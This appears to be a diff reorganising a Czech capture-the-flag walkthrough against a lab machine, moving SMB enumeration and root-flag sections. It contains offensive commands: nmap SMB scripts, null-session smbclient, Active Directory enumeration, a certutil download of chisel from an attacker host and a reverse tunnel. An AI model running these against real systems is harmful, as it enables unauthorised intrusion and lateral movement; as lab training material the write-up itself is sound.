@@ -113,6 +113,20 @@ http://10.10.10.154/user/transfer.php
 => document.cookie="id=3; username=dGhhY2tlcg%3D%3D; password=__CENSORED__
 ```
 
+### Vyhledání otevřených portů (2)
+
+Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
+```bash
+nmap $IP -p 139,445 -v --script=smb-enum* --script-args=smbuser=root,smbpass=pass,smbdomain=workgroup
+```
+
+### Enumerace SMB
+
+U SMB sdílení ověřuji, jaká data jsou dostupná bez dalších oprávnění a zda z nich lze získat účty, dokumenty nebo konfigurační tajemství.
+```bash
+smbclient -L $IP -N
+```
+
 ## Získání přístupu
 
 ### Získání user flagu
@@ -124,20 +138,6 @@ more user.txt
 ```
 __CENSORED__
 ```
-
-## Eskalace oprávnění
-
-### Získání root flagu
-
-Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
-```bash
-more root.txt
-```
-```
-__CENSORED__
-```
-
-## Získání přístupu
 
 ### Spuštění exploitu
 
@@ -157,24 +157,6 @@ certutil.exe -urlcache -split -f http://10.10.14.223:8000/exe/chisel_windows_amd
 chisel_windows_amd64.exe client 10.10.14.223:8008 R:910:0.0.0.0:910
 chisel server -p 8008 --reverse
 ```
-
-## Počáteční průzkum
-
-### Vyhledání otevřených portů (2)
-
-Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
-```bash
-nmap $IP -p 139,445 -v --script=smb-enum* --script-args=smbuser=root,smbpass=pass,smbdomain=workgroup
-```
-
-### Enumerace SMB
-
-U SMB sdílení ověřuji, jaká data jsou dostupná bez dalších oprávnění a zda z nich lze získat účty, dokumenty nebo konfigurační tajemství.
-```bash
-smbclient -L $IP -N
-```
-
-## Získání přístupu
 
 ### Spuštění exploitu (2)
 
@@ -201,6 +183,18 @@ impacket-samrdump -csv $IP
 
 ./windapsearch/windapsearch.py --dc-ip $IP --full --functionality -G -U -PU -C --da --admin-objects --user-spns --unconstrained-users --unconstrained-computers --gpos  > windapsearch.txt
 ./windapsearch/windapsearch.py --dc-ip $IP -u user -p pass --full --functionality -G -U -PU -C --da --admin-objects --user-spns --unconstrained-users --unconstrained-computers --gpos  > windapsearch.txt
+```
+
+## Eskalace oprávnění
+
+### Získání root flagu
+
+Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
+```bash
+more root.txt
+```
+```
+__CENSORED__
 ```
 
 ## Shrnutí klíčových poznatků
